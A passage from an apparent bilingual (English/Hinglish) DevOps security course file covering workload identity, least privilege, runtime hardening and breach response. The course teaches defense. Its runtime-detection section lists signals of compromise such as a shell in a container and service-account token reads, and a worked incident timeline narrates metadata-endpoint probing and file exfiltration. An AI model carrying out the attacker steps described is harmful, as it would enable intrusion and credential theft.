`MaxSessionDuration` LOW (15-60 min). (5) RE-REVIEW whenever the workload\'s behaviour changes; ALERT on `AccessDenied` in CloudTrail for this role — that tells you EITHER the policy is too tight (a legit new call) OR something is PROBING. GOAL: short-lived AND scoped. short-lived AND admin is barely better than a static admin key.',
        hintHi: 'WORKLOAD IDENTITY aur LEAST PRIVILEGE DO INDEPENDENT problems solve karते hain. WORKLOAD IDENTITY = credential kaise DELIVERED hai. LEAST PRIVILEGE = credential ko KYA karने ki permission hai. "IRSA + AdministratorAccess" TRAP: IRSA sahi setup hai (no static key), par attached role `AdministratorAccess` hai. Pod ADMIN assume karता hai ek clean OIDC flow ke through. Credential "short-lived" SIRF is sense mein ki har token 15 min mein expire hoता hai — par AUTO-RENEWED indefinitely, aur har window mein ADMIN. Attacker loop par credential provider call karता hai -> ROLLING 15-min admin = FUNCTIONALLY PERMANENT ADMIN. Key problem solved; privilege problem UNTOUCHED. SCOPE KAISE KAREN: (1) CloudTrail ON; ek REPRESENTATIVE period par HAR API call collect karो (ya IAM Access Analyzer). (2) ek policy likhो jо EXACTLY wo actions EXACTLY un ARNs par allow karती hai. (3) CONDITION KEYS add karो (`aws:SourceVpc`, s3 prefix). (4) `MaxSessionDuration` LOW (15-60 min). (5) `AccessDenied` par ALERT karो.',
      },
      {
        task: 'In a comment, explain the blast-radius exercise and how least privilege applies at every layer (IAM role, K8s RBAC, NetworkPolicy default-deny, fs/caps, DB role), then describe "the test".',
        taskHi: 'Ek comment mein, blast-radius exercise samjhाओ aur har layer par least privilege.',
        hint: 'THE BLAST-RADIUS EXERCISE makes least privilege CONCRETE: for EACH workload ask ONE question — "if this is FULLY COMPROMISED (an attacker has a root shell in it), what can they REACH?" Enumerate that reach EXHAUSTIVELY: which secrets it can read, which cloud API calls its role permits, which other pods it can connect to, which DB rows it can touch, whether it can talk to the k8s API, whether it can reach `169.254.169.254`. THEN cut EVERY dimension to the minimum the workload ACTUALLY uses. LAYER BY LAYER: (1) IAM / CLOUD ROLE — only the EXACT API actions on the EXACT resource ARNs it uses. NO `*`. NEVER `iam:*`. `MaxSessionDuration` in MINUTES not hours. Condition keys (`aws:SourceVpc`, resource tags, s3 prefix). (2) K8S RBAC — `get` on its OWN configmap/secret BY NAME (`resourceNames`); NO `list` (list bypasses resourceNames + returns full contents); NO cluster-scoped roles; NO create/delete on workloads; its OWN namespace only. Better: read a kubelet-mounted file -> needs NO secret RBAC at all. (3) NETWORKPOLICY — DEFAULT-DENY ingress AND egress per namespace (`podSelector: {}`, `policyTypes: [Ingress, Egress]`), THEN per-workload policies allowing ONLY the specific pods + ports it actually talks to (its ingress from the ingress controller / its callers; its egress to the DB, cache, DNS `:53`, Vault, the k8s API if needed). Services that never need internet egress get NONE; the one that calls a 3rd-party API goes through an EGRESS GATEWAY with an allowlist. BLOCK egress to `169.254.169.254/32` cluster-wide (+ IMDSv2 hop limit as defence in depth). (4) FILESYSTEM / CAPS (Module 18 L4) — `runAsNonRoot`, `runAsUser 10001`, `drop: ["ALL"]` caps, `readOnlyRootFilesystem: true` + an emptyDir at `/tmp`, `seccompProfile: RuntimeDefault`. (5) DB ROLE (Lesson 3) — dynamic creds; the role grants ONLY the tables + operations in use (e.g. `SELECT, INSERT on images, image_variants` — not `ALL on *`), short lease. RESULT: an RCE in one service reaches a HANDFUL of specific, TIME-LIMITED things instead of cascading through the whole estate. "THE TEST": take the service with the LARGEST attack surface (the public API, the image processor, whatever takes untrusted input); write down — concretely + exhaustively — everything a root shell in it can reach TODAY (the "before" list). If that list is LONG, you have privilege to remove AND the exercise has told you EXACTLY where. Repeat after every significant change — privilege ACCUMULATES.',
        hintHi: 'BLAST-RADIUS EXERCISE least privilege ko CONCRETE banaता hai: HAR workload ke liye EK sawaal — "agar ye FULLY COMPROMISED hai (root shell), wo kya REACH kar sakते hain?" Us reach ko EXHAUSTIVELY enumerate karो, phir HAR dimension ko minimum tak cut karो. LAYERS: (1) IAM ROLE — sirf EXACT actions on EXACT ARNs. NO `*`. NEVER `iam:*`. `MaxSessionDuration` MINUTES. Condition keys. (2) K8S RBAC — apne configmap/secret par `get` BY NAME (`resourceNames`); NO `list`; NO cluster-scope; apna namespace only. Better: kubelet-mounted file -> NO secret RBAC. (3) NETWORKPOLICY — DEFAULT-DENY ingress AND egress per namespace, PHIR per-workload sirf specific pods+ports allow karो. `169.254.169.254/32` egress BLOCK karो. (4) FS/CAPS (M18 L4) — non-root, drop ALL caps, read-only rootfs, seccomp. (5) DB ROLE (L3) — dynamic creds, sirf wo tables+operations. RESULT: ek RCE कुछ specific, TIME-LIMITED cheezein reach karता hai. "THE TEST": sabse bade attack surface wali service lो; "before" list likhो; agar LAMBI hai, cut karने ke liye privilege hai. Har change ke baad repeat karो.',
      },
    ],

    keyTakeaways: [
      'WORKLOAD IDENTITY eliminates the LAST long-lived credential — the one the app uses to prove it may call the secrets manager and cloud APIs. It replaces a stored key with a SHORT-LIVED, PLATFORM-ISSUED, CRYPTOGRAPHICALLY-VERIFIABLE token valid only FROM that workload.',
      'THE OIDC FEDERATION FLOW: (1) the platform issues the workload a signed JWT (`sub=system:serviceaccount:prod:api`, short TTL, audience-scoped, auto-rotated); (2) the workload presents it to a target (STS/Vault/GCP); (3) the target verifies the signature against the platform\'s public OIDC keys + checks issuer/audience/subject; (4) it issues its OWN short-lived scoped credential. No static key anywhere.',
      'IMPLEMENTATIONS: AWS IRSA / EKS Pod Identity (`AssumeRoleWithWebIdentity`, trust policy names the SA subject), GCP Workload Identity (no key file), Azure Workload Identity (federated credential, no client secret), SPIFFE/SPIRE (an SVID per workload, `spiffe://...`, for mTLS + universal identity), and cloud instance metadata on a VM — where IMDSv2 (session token + hop limit) is essential to block SSRF-to-metadata (the Capital One 2019 breach).',
      'WORKLOAD IDENTITY ≠ LEAST PRIVILEGE. IRSA with an `AdministratorAccess` role gives a 15-minute token that auto-renews forever and is admin the whole time — functionally permanent admin. Scope the role separately: observe real API usage (CloudTrail / Access Analyzer), grant exactly those actions on exactly those ARNs, add condition keys, keep sessions short, alert on `AccessDenied`.',
      'LEAST PRIVILEGE = the BLAST-RADIUS exercise: for each workload, "if this gets a root shell, what can it reach?" — then cut every layer to the minimum: IAM role (exact actions/ARNs, no `*`, minutes-long sessions), K8s RBAC (`get` by `resourceNames`, never `list`, own namespace), NetworkPolicy (default-deny ingress+egress, allow only real edges, block the metadata endpoint), fs/caps (Module 18 L4), DB role (Lesson 3 dynamic, tables in use only). THE TEST: write the "before" reach-list for your most exposed service.',
    ],
    keyTakeawaysHi: [
      'WORKLOAD IDENTITY AAKHRI long-lived credential ko eliminate karता hai — wo jо app use karती hai ye saabit karने ke liye ki ye secrets manager aur cloud APIs call kar sakती hai. Ye ek stored key ko ek SHORT-LIVED, PLATFORM-ISSUED, VERIFIABLE token se replace karता hai jо sirf us workload SE valid hai.',
      'OIDC FEDERATION FLOW: (1) platform workload ko ek signed JWT issue karता hai (`sub=system:serviceaccount:prod:api`, short TTL, audience-scoped, auto-rotated); (2) workload ise ek target ko present karता hai (STS/Vault/GCP); (3) target signature ko platform ke public OIDC keys ke against verify karता hai + issuer/audience/subject check karता hai; (4) ye apni short-lived scoped credential issue karता hai. Kahीं koi static key nahi.',
      'IMPLEMENTATIONS: AWS IRSA / EKS Pod Identity, GCP Workload Identity (koi key file nahi), Azure Workload Identity (federated credential, koi client secret nahi), SPIFFE/SPIRE (per workload ek SVID, `spiffe://...`, mTLS + universal identity ke liye), aur ek VM par cloud instance metadata — jahaan IMDSv2 (session token + hop limit) SSRF-to-metadata block karने ke liye essential hai (Capital One 2019 breach).',
      'WORKLOAD IDENTITY ≠ LEAST PRIVILEGE. Ek `AdministratorAccess` role ke saath IRSA ek 15-minute token deता hai jо hamesha ke liye auto-renew karता hai aur poore samay admin hai — functionally permanent admin. Role ko alag se scope karो: real API usage observe karो (CloudTrail / Access Analyzer), exactly wo actions exactly un ARNs par grant karो, condition keys add karो, sessions short rakhो, `AccessDenied` par alert karो.',
      'LEAST PRIVILEGE = BLAST-RADIUS exercise: har workload ke liye, "agar isme ek root shell aata hai, ye kya reach kar sakती hai?" — phir har layer ko minimum tak cut karो: IAM role (exact actions/ARNs, koi `*` nahi), K8s RBAC (`resourceNames` se `get`, kabhi `list` nahi), NetworkPolicy (default-deny ingress+egress, sirf real edges allow karो, metadata endpoint block karो), fs/caps (Module 18 L4), DB role (Lesson 3 dynamic). THE TEST: apni sabse exposed service ke liye "before" reach-list likhो.',
    ],
  },

  {
    slug: 'ops-runtime-hardening-and-breach-response',
    title: 'Runtime Hardening & Breach Response',
    titleHi: 'Runtime Hardening Aur Breach Response',
    description:
      'The controls that operate while the system is running and being attacked: host and node hardening (CIS benchmarks, seccomp, AppArmor, Pod Security Standards), TLS everywhere and mutual TLS between services, a WAF and rate limiting and bot and DDoS protection at the edge, audit logging that is tamper-evident, and runtime threat detection. Then the incident-response playbook for a confirmed breach — contain, rotate, investigate, recover, disclose — and why the order and the preparation matter more than the tooling.',
    descriptionHi:
      'Wo controls jо system ke running aur attack hone ke dauraan operate karте hain: host aur node hardening (CIS benchmarks, seccomp, AppArmor, Pod Security Standards), har jagah TLS aur services ke beech mutual TLS, edge par ek WAF aur rate limiting aur bot aur DDoS protection, audit logging jо tamper-evident hai, aur runtime threat detection. Phir ek confirmed breach ke liye incident-response playbook — contain, rotate, investigate, recover, disclose — aur kyun order aur preparation tooling se zyada matter karते hain.',
    difficulty: 'HARD',
    duration: 26,
    order: 6,

    analogy: {
      en: '**A building\'s security once people are inside, plus the plan for a break-in.** Locks on the doors are the supply-chain and image work from earlier modules. Runtime hardening is everything that operates while the building is occupied: reinforced internal doors so a thief in the lobby cannot reach the vault, cameras that record to an off-site tape, motion sensors, a guard who notices someone in a restricted corridor. And the incident-response plan is the sealed envelope every manager has: what to do the moment the alarm goes off — who calls whom, which doors to lock, what not to touch so the investigators can work, and who talks to the press. The organisations that come through a break-in well are the ones that rehearsed the envelope, not the ones with the most cameras.',
      hi: '**Ek building ki security jab log andar hain, plus ek break-in ke liye plan.** Doors par locks pehle modules se supply-chain aur image work hain. Runtime hardening sab kुछ hai jо building ke occupied hone ke dauraan operate karता hai: reinforced internal doors taaki lobby mein ek chor vault tak na pahunch sake, cameras jо ek off-site tape par record karते hain, motion sensors. Aur incident-response plan wo sealed envelope hai jо har manager ke paas hai: alarm bajते hi kya karna — kaun kise call karता hai, kaun se doors lock karne hain, kya touch nahi karna. Jо organisations ek break-in se acchी tarah nikalती hain wo wo hain jinhone envelope rehearse kiya.',
    },

    simple: `**RUNTIME HARDENING — controls that operate while the system runs:**

**1. HOST / NODE:**
\`\`\`
- CIS Benchmarks (a checklist per OS / k8s / cloud) - run 'kube-bench',
  'oscap' / a CIS-hardened AMI; automate the check, track drift.
- minimal node OS (Bottlerocket / Flatcar / Talos) - immutable, tiny, no ssh,
  no package manager. patch by replacing the node, not 'apt upgrade'.
- seccomp (RuntimeDefault min; a custom profile for high-risk pods) + AppArmor /
  SELinux - confine what syscalls / file paths a container can use.
- Pod Security Standards 'restricted' enforced at admission (non-root, drop caps,
  no host namespaces/hostPath/privileged, seccomp) - Module 18 L4.
- no shared node between wildly different trust levels; sensitive workloads on
  their own node pool / with gVisor / Kata (a real kernel boundary).
\`\`\`

**2. TLS EVERYWHERE + mTLS BETWEEN SERVICES:**
\`\`\`
- TLS on every hop, including inside the cluster. terminate at the edge AND
  re-encrypt to the pod (or mTLS end to end).
- mTLS between services: each side presents a cert (a SPIFFE SVID - Lesson 5) ->
  identity + encryption on every internal call. a service mesh (Istio/Linkerd)
  or the app framework does this.
- automate cert issuance + rotation (cert-manager + an ACME/CA). short-lived certs.
- HSTS, modern ciphers, TLS 1.2+ only, OCSP stapling.
\`\`\`

**3. EDGE — WAF / rate limit / bot / DDoS:**
\`\`\`
- WAF: blocks common injection / path traversal / known-bad patterns. RUN IN
  MONITOR MODE FIRST, tune, then enforce (a WAF that false-positives gets bypassed).
- rate limiting per IP / per API key / per route (Module 17 L3). tighter on
  auth + expensive endpoints.
- bot management (fingerprinting, challenges) for scraping / credential stuffing.
- DDoS: a scrubbing provider (Cloudflare / AWS Shield / Azure) absorbs L3/4;
  L7 needs rate limits + caching + autoscaling headroom.
\`\`\`

**4. AUDIT LOGGING + TAMPER-EVIDENCE:**
\`\`\`
- log auth events, admin actions, secret access, config changes, k8s API
  (audit policy), cloud API (CloudTrail / equivalent).
- ship to a SEPARATE account / a WORM store (S3 Object Lock, an append-only SIEM) -
  an attacker who compromises prod must NOT be able to erase the evidence.
- time-sync (NTP) everything so timelines line up. retain per policy (often 1 yr+).
\`\`\`

**5. RUNTIME THREAT DETECTION:** Falco / a cloud equivalent watches syscalls +
k8s events for "shell in a container", "write to /etc", "outbound to a new IP",
"a serviceaccount token read from an unexpected process".

**BREACH RESPONSE — the order matters (and rehearse it):**
\`\`\`
0. PREPARE (before): a written runbook, an on-call rota, roles (IC, comms, scribe),
   break-glass access, a comms plan, legal/PR on speed-dial, backups you've restored.
1. DECLARE + CONTAIN: isolate the affected workload/account (revoke creds, cut
   network, snapshot for forensics, DON'T just delete it). stop the bleeding.
2. ROTATE: every credential the blast radius touched (Lesson 5 tells you the list).
   assume all of it is compromised.
3. INVESTIGATE: from the tamper-evident logs - entry point, timeline, what was
   accessed/exfiltrated, is the attacker still in.
4. ERADICATE + RECOVER: rebuild from known-good (not "clean" the compromised host),
   patch the entry point, restore data if needed, watch for re-entry.
5. DISCLOSE: per legal obligation (GDPR 72h, contracts, regulators) + customers.
   honest, specific, timely.
6. POSTMORTEM: blameless (Module 15). the fixes are action items with owners + dates.
\`\`\``,

    simpleHi: `**RUNTIME HARDENING — controls jо system ke run hone ke dauraan operate karте hain:**

**1. HOST / NODE:**
\`\`\`
- CIS Benchmarks (per OS / k8s / cloud ek checklist) - 'kube-bench', 'oscap' chalाओ;
  check automate karो, drift track karो.
- minimal node OS (Bottlerocket / Flatcar / Talos) - immutable, tiny, no ssh.
  node replace karके patch karो, 'apt upgrade' nahi.
- seccomp (RuntimeDefault min) + AppArmor / SELinux - confine karो ek container kya use kar sakта hai.
- Pod Security Standards 'restricted' admission par enforced - Module 18 L4.
- wildly alag trust levels ke beech koi shared node nahi; sensitive workloads apne
  node pool par / gVisor / Kata ke saath (ek real kernel boundary).
\`\`\`

**2. HAR JAGAH TLS + SERVICES KE BEECH mTLS:**
\`\`\`
- har hop par TLS, cluster ke andar bhi. edge par terminate AUR pod tak re-encrypt karो.
- services ke beech mTLS: har side ek cert present karता hai (ek SPIFFE SVID - Lesson 5) ->
  har internal call par identity + encryption. ek service mesh (Istio/Linkerd) ye karता hai.
- cert issuance + rotation automate karो (cert-manager + ek ACME/CA). short-lived certs.
- HSTS, modern ciphers, TLS 1.2+ only, OCSP stapling.
\`\`\`

**3. EDGE — WAF / rate limit / bot / DDoS:**
\`\`\`
- WAF: common injection / path traversal / known-bad patterns block karता hai. PEHLE
  MONITOR MODE MEIN CHALAO, tune karो, phir enforce karो.
- rate limiting per IP / per API key / per route (Module 17 L3). auth + expensive endpoints par tighter.
- bot management (fingerprinting, challenges) scraping / credential stuffing ke liye.
- DDoS: ek scrubbing provider (Cloudflare / AWS Shield / Azure) L3/4 absorb karता hai;
  L7 ko rate limits + caching + autoscaling headroom chahिए.
\`\`\`

**4. AUDIT LOGGING + TAMPER-EVIDENCE:**
\`\`\`
- auth events, admin actions, secret access, config changes, k8s API, cloud API log karो.
- ek SEPARATE account / ek WORM store (S3 Object Lock, ek append-only SIEM) par ship karो -
  ek attacker jо prod compromise karता hai evidence erase NAHI kar pana chahिए.
- sab kुछ time-sync (NTP) karो. per policy retain karो (aksar 1 yr+).
\`\`\`

**5. RUNTIME THREAT DETECTION:** Falco / ek cloud equivalent syscalls + k8s events
watch karता hai "ek container mein shell", "/etc par write", "ek naye IP par outbound" ke liye.

**BREACH RESPONSE — order matters (aur ise rehearse karो):**
\`\`\`
0. PREPARE (pehle): ek written runbook, ek on-call rota, roles (IC, comms, scribe),
   break-glass access, ek comms plan, legal/PR speed-dial par, backups jо aapne restore kiye.
1. DECLARE + CONTAIN: affected workload/account isolate karो (creds revoke karो, network
   cut karो, forensics ke liye snapshot karो, ISE SIRF DELETE MAT KARO). bleeding rोkो.
2. ROTATE: har credential jо blast radius ne touch kiya (Lesson 5 aapko list batाता hai).
   maan lो sab compromised hai.
3. INVESTIGATE: tamper-evident logs se - entry point, timeline, kya accessed/exfiltrated,
   kya attacker abhi bhi andar hai.
4. ERADICATE + RECOVER: known-good se rebuild karो (compromised host "clean" mat karो),
   entry point patch karो, data restore karो agar zaroori, re-entry ke liye watch karो.
5. DISCLOSE: legal obligation ke hisaab se (GDPR 72h, contracts, regulators) + customers.
   honest, specific, timely.
6. POSTMORTEM: blameless (Module 15). fixes owners + dates ke saath action items hain.
\`\`\``,

    content: `## Host and node hardening

The nodes that run your workloads are part of the attack surface. CIS Benchmarks provide a per-platform checklist — for the operating system, for Kubernetes, for the cloud account — and tools like \`kube-bench\`, \`oscap\`, and CIS-hardened machine images let you apply and continuously verify it rather than treating hardening as a one-time task. A minimal, immutable node operating system — Bottlerocket, Flatcar, Talos — removes most of the surface by having no SSH daemon, no package manager, and no general-purpose userland, and you patch it by replacing the node rather than mutating it in place. Seccomp confines the set of system calls a container can make, with \`RuntimeDefault\` as the baseline and a custom profile for high-risk workloads; AppArmor or SELinux add mandatory access control over file paths and capabilities. Pod Security Standards enforced at admission — the \`restricted\` profile requiring non-root, dropped capabilities, no host namespaces, no \`hostPath\`, no privileged containers, and a seccomp profile — is the Module 18 Lesson 4 material applied as a cluster-wide gate. And workloads at very different trust levels should not share a node: a sandboxed runtime like gVisor or Kata Containers, or a dedicated node pool, gives a real kernel boundary where namespace isolation alone is not enough.

## TLS everywhere and mutual TLS

Encryption in transit should cover every hop, including traffic between pods inside the cluster, which is not private by default. Terminating TLS at the edge and speaking plaintext to the pod leaves the internal segment exposed to anything on that network; you re-encrypt to the pod or run mutual TLS end to end. Mutual TLS between services means each side presents a certificate — ideally a SPIFFE SVID tied to the workload identity from Lesson 5 — so every internal call carries both encryption and a verified identity, which lets services authorise each other rather than trusting the network. A service mesh such as Istio or Linkerd provides this transparently, or the application framework does it directly. Certificate issuance and rotation must be automated — cert-manager with an ACME provider or an internal CA — and certificates kept short-lived. At the edge, enforce HSTS, modern cipher suites, TLS 1.2 or higher only, and OCSP stapling.

## Edge protection

A web application firewall inspects incoming requests for common attack patterns — SQL injection, path traversal, known exploit signatures — and blocks them, but it must be run in monitoring mode first and tuned against real traffic, because a WAF that produces false positives gets disabled or bypassed and then protects nothing. Rate limiting, covered in Module 17 Lesson 3, is applied per IP, per API key, and per route, with tighter limits on authentication endpoints and expensive operations. Bot management — fingerprinting and challenges — addresses scraping and credential stuffing. For denial of service, a scrubbing provider such as Cloudflare, AWS Shield, or Azure\'s DDoS protection absorbs volumetric layer 3 and 4 attacks upstream of your infrastructure, while layer 7 attacks are handled with rate limits, aggressive caching, and enough autoscaling headroom to ride out a surge.

## Audit logging and tamper-evidence

Log the events that matter for an investigation: authentication successes and failures, administrative actions, secret access, configuration changes, the Kubernetes API server audit stream, and the cloud provider audit trail such as CloudTrail. The critical property is tamper-evidence: these logs must be shipped to a location the production environment cannot modify — a separate cloud account, an S3 bucket with Object Lock, an append-only SIEM — so that an attacker who compromises production cannot delete the record of what they did. Everything must be time-synchronised through NTP so that events from different systems can be placed on one timeline, and retention should follow policy, which is often a year or more for security-relevant logs.

## Runtime threat detection

Runtime detection watches the system as it operates for behaviour that indicates compromise. Falco and its cloud equivalents monitor system calls and Kubernetes events for patterns like a shell being spawned inside a container, a write to \`/etc\` or another sensitive path, an outbound connection to an IP the workload has never contacted, or a ServiceAccount token being read by a process that is not the application. These are signals that something has gone wrong after all the preventive controls, and they feed alerts and, where safe, automated responses like isolating the pod.

## Breach response

When a breach is confirmed, the order of operations matters more than the tooling, and the single biggest determinant of how well it goes is preparation done beforehand. Before any incident, you need a written runbook, an on-call rotation, defined roles — an incident commander, a communications lead, a scribe — a tested break-glass access path, a communications plan covering customers and regulators, legal and PR contacts reachable immediately, and backups you have actually restored from. When an incident is declared, the first action is to contain: isolate the affected workload or account by revoking its credentials and cutting its network access, and snapshot it for forensics rather than deleting it, because the deleted evidence is the evidence you will most want. Second, rotate every credential the blast radius touched — the exercise from Lesson 5 is what tells you that list — on the assumption that all of it is compromised. Third, investigate from the tamper-evident logs: the entry point, the timeline, what was accessed and whether data was exfiltrated, and whether the attacker still has a foothold. Fourth, eradicate and recover by rebuilding from known-good images and infrastructure rather than trying to clean a compromised host, patching the entry point, restoring data if it was damaged, and watching closely for re-entry. Fifth, disclose according to your legal obligations — GDPR requires notification within 72 hours, contracts and sector regulators impose their own timelines — and to affected customers, honestly and specifically. Sixth, run a blameless postmortem, as in Module 15, turning the findings into action items with owners and dates. Teams that come through a breach well are the ones that rehearsed this sequence, not the ones that bought the most tools.`,

    contentHi: `## Host aur node hardening

Wo nodes jо aapke workloads chalाते hain attack surface ka hissa hain. CIS Benchmarks ek per-platform checklist provide karते hain, aur \`kube-bench\`, \`oscap\`, aur CIS-hardened machine images jaise tools aapko ise apply aur continuously verify karने dete hain hardening ko ek one-time task treat karने ke bजाy. Ek minimal, immutable node operating system — Bottlerocket, Flatcar, Talos — zyादातर surface remove karता hai koi SSH daemon, koi package manager, aur koi general-purpose userland na hone se, aur aap ise node replace karके patch karते ho. Seccomp system calls ke set ko confine karता hai jо ek container kar sakता hai. Pod Security Standards admission par enforced — \`restricted\` profile — Module 18 Lesson 4 material hai cluster-wide gate ke roop mein apply. Aur bahut alag trust levels par workloads ko ek node share nahi karना chahिए: gVisor ya Kata Containers jaise ek sandboxed runtime ek real kernel boundary deता hai.

## Har jagah TLS aur mutual TLS

Encryption in transit ko har hop cover karना chahिए, cluster ke andar pods ke beech traffic bhi, jо by default private nahi hai. Edge par TLS terminate karना aur pod se plaintext bolना internal segment ko exposed chhodता hai. Services ke beech mutual TLS ka matlab har side ek certificate present karता hai — ideally ek SPIFFE SVID Lesson 5 se workload identity se tied — to har internal call encryption aur ek verified identity dono carry karता hai. Istio ya Linkerd jaisा ek service mesh ye transparently provide karता hai. Certificate issuance aur rotation automated hone chahिए — cert-manager ek ACME provider ya ek internal CA ke saath.

## Edge protection

Ek web application firewall incoming requests ko common attack patterns ke liye inspect karता hai aur unhe block karता hai, par ise pehle monitoring mode mein chalाना aur real traffic ke against tune karना chahिए, kyunki ek WAF jо false positives produce karता hai disabled ya bypassed ho jaता hai. Rate limiting per IP, per API key, aur per route apply hoती hai. Denial of service ke liye, Cloudflare, AWS Shield, ya Azure ki DDoS protection jaisा ek scrubbing provider volumetric layer 3 aur 4 attacks absorb karता hai.

## Audit logging aur tamper-evidence

Un events ko log karो jо ek investigation ke liye matter karते hain: authentication successes aur failures, administrative actions, secret access, configuration changes, Kubernetes API server audit stream, aur cloud provider audit trail. Critical property tamper-evidence hai: ye logs ek aisी location par ship hone chahिए jise production environment modify nahi kar sakта — ek separate cloud account, Object Lock ke saath ek S3 bucket, ek append-only SIEM. Sab kुछ NTP ke through time-synchronised hona chahिए.

## Runtime threat detection

Runtime detection system ko operate karते hue watch karता hai us behaviour ke liye jо compromise indicate karता hai. Falco aur iske cloud equivalents system calls aur Kubernetes events ko patterns ke liye monitor karते hain jaise ek container ke andar ek shell spawn hoना, \`/etc\` par ek write, ek IP par ek outbound connection jise workload ne kabhi contact nahi kiya.

## Breach response

Jab ek breach confirmed hoता hai, operations ka order tooling se zyada matter karता hai, aur ye kitna acha jaता hai iska single sabse bada determinant preparation hai jо pehle kiya gaya. Kisi bhi incident se pehle, aapko ek written runbook, ek on-call rotation, defined roles, ek tested break-glass access path, ek communications plan, aur backups jinse aapne actually restore kiya hai chahिए. Jab ek incident declared hoता hai, pehla action contain karना hai: affected workload ya account ko iske credentials revoke karके aur iski network access cut karके isolate karो, aur ise delete karने ke bजाy forensics ke liye snapshot karो. Doosra, har credential jо blast radius ne touch kiya rotate karो. Teesra, tamper-evident logs se investigate karो. Chौthा, known-good images se rebuild karके eradicate aur recover karो. Paanchва, apni legal obligations ke hisaab se disclose karो — GDPR 72 hours ke andar notification require karता hai. Chhathा, ek blameless postmortem chalाओ.`,

    examples: [
      {
        title: 'A breach-response timeline: the order of operations, and what goes wrong when it is skipped',
        titleHi: 'Ek breach-response timeline: operations ka order, aur jab ise skip kiya jaता hai to kya galat hoता hai',
        code: `# (prose worked example - a confirmed breach, handled in order vs handled badly)
# =============================================================================
# SIGNAL: Falco alert "shell spawned in pod prod/image-resizer" + an outbound
#         connection to an unknown IP. on-call pages the IC.
#
# ---- HANDLED IN ORDER ----
# T+0    DECLARE. IC assigned, comms lead + scribe assigned, incident channel opened.
# T+3m   CONTAIN. cordon+drain is NOT enough (attacker has creds). instead:
#          - revoke the pod's IRSA role sessions (delete the role's inline policy
#            temporarily / add a Deny-all with a condition, or delete the SA)
#          - apply a deny-all NetworkPolicy to prod/image-resizer
#          - SNAPSHOT the node's disk + memory for forensics
#          - scale the deployment to 0 (do NOT 'kubectl delete pod' - keep it)
# T+15m  ROTATE. from the blast-radius list (Lesson 5): the image-resizer-db
#          dynamic creds ('vault lease revoke -prefix'), the S3 bucket... it was
#          scoped to 2 prefixes so nothing else. the SA token (auto on delete).
#          check: was the role used for anything outside those 2 prefixes in
#          CloudTrail? (no.)
# T+1h   INVESTIGATE. from the WORM audit logs (separate account): entry = a
#          crafted TIFF hitting a known libvips CVE. attacker read /tmp, tried
#          169.254.169.254 (blocked - IMDSv2 + NetworkPolicy), tried to list
#          secrets (denied - resourceNames), exfil'd the 40 files in /incoming.
# T+4h   ERADICATE. new image with libvips patched + the CVE added to the CI
#          Trivy gate. rebuild the node from the golden image. redeploy.
# T+1d   DISCLOSE. 40 user uploads exposed -> notify those 40 users + the DPA
#          within 72h (GDPR). status page updated.
# T+1w   POSTMORTEM. action items: (1) libvips wasn't in the SBOM scan - fix.
#          (2) /incoming should be write-only for the resizer - fix. (3) add a
#          Falco rule for 'image tool spawns a shell' with auto-isolate.
#
# ---- HANDLED BADLY (what skipping the order costs) ----
#   - 'kubectl delete pod' first  -> forensics gone. can't tell what was taken.
#   - rotate nothing ("the pod's dead")  -> the STS creds the attacker copied are
#       still valid for 15 min AND the attacker already used them to write a
#       second payload to the S3 /resized prefix. re-entry that afternoon.
#   - investigate from the prod logs (which the attacker had access to)  ->
#       they'd deleted the relevant lines. timeline has a hole.
#   - 'clean' the node (kill the process, rm the binary) instead of rebuilding
#       -> a cron persistence the responder didn't find re-spawns in 6 hours.
#   - disclose late / vaguely  -> a regulator finding + a trust hit worse than
#       the breach.
# =============================================================================
echo "in order: contained in 3m, rotated in 15m, no re-entry, disclosed in 72h, 3 concrete fixes"
echo "badly:    forensics destroyed, attacker re-entered same day, persistence missed, late disclosure"`,
        output: `in order: contained in 3m, rotated in 15m, no re-entry, disclosed in 72h, 3 concrete fixes
badly:    forensics destroyed, attacker re-entered same day, persistence missed, late disclosure`,
        explain: 'The same breach, handled two ways. The signal is a runtime-detection alert — a shell in a container that has no legitimate reason to spawn one, plus an unexpected outbound connection. Handled in order: the incident is declared with roles assigned, then contained by revoking the workload\'s credentials and network access and snapshotting for forensics before scaling the deployment to zero — deliberately not deleting the pod, because that destroys the evidence. Then every credential in the blast radius is rotated on the assumption it is compromised, which is fast and bounded precisely because the least-privilege work from Lesson 5 limited that list to two S3 prefixes and one dynamic database role. The investigation runs from audit logs held in a separate account the attacker could not reach, establishing the entry point (an image-parsing CVE), confirming that the hardening held (the metadata endpoint and the secret list were both blocked), and quantifying what was taken. Eradication rebuilds from known-good rather than cleaning the host, disclosure happens within the regulatory window, and the postmortem produces specific fixes. Handled badly, each skipped or reordered step has a concrete cost: deleting the pod first loses the forensics, skipping rotation leaves the copied STS credentials live long enough for the attacker to re-enter, investigating from compromised logs misses what was deleted, cleaning instead of rebuilding leaves persistence in place, and late vague disclosure turns a contained incident into a regulatory and trust problem larger than the breach itself.',
        explainHi: 'Wahi breach, do tarah handle kiya. Signal ek runtime-detection alert hai — ek container mein ek shell jिske paas ek spawn karने ka koi legitimate reason nahi hai, plus ek unexpected outbound connection. Order mein handle kiya: incident roles assigned ke saath declared hoता hai, phir workload ke credentials aur network access revoke karके aur forensics ke liye snapshot karके contained — deliberately pod delete nahi karते, kyunki wo evidence destroy karта hai. Phir blast radius mein har credential rotate hoता hai, jо fast aur bounded hai kyunki Lesson 5 se least-privilege work ne us list ko do S3 prefixes aur ek dynamic database role tak limited kiya. Investigation ek separate account mein rakhे audit logs se chalती hai. Eradication known-good se rebuild karта hai. Badly handle kiya, har skipped step ki ek concrete cost hai: pod ko pehle delete karना forensics khो deता hai, rotation skip karना copied STS credentials ko live chhod deता hai.',
      },
    ],

    mistakes: [
      {
        wrong: `# the incident response IS the runbook, written during the incident
  # 2am: PagerDuty fires. the on-call engineer:
  #  - doesn't know who the incident commander should be (no rota for that)
  #  - doesn't have prod admin (it's "ask the platform team", who are asleep)
  #  - can't find the break-glass procedure (it's a Confluence page nobody bookmarked)
  #  - starts debugging in the prod pod, running commands, restarting things
  #  - by the time a lead is online (40 min), the pod's been restarted twice
  #    (forensics gone), no one is writing down what's been done, and the CEO is
  #    asking in Slack what to tell customers - with no plan.
  # every minute is spent inventing process instead of executing it.`,
        right: `# prepare the response before you need it; rehearse it
  # a written IR runbook, linked from the alert itself, covering:
  #  - HOW to declare an incident + open the channel (a slash command / a template)
  #  - ROLES: incident commander (decides), comms lead (external + exec updates),
  #    scribe (timeline), + SMEs pulled in as needed. named backups for each.
  #  - CONTAINMENT playbooks per scenario (compromised pod / leaked cloud key /
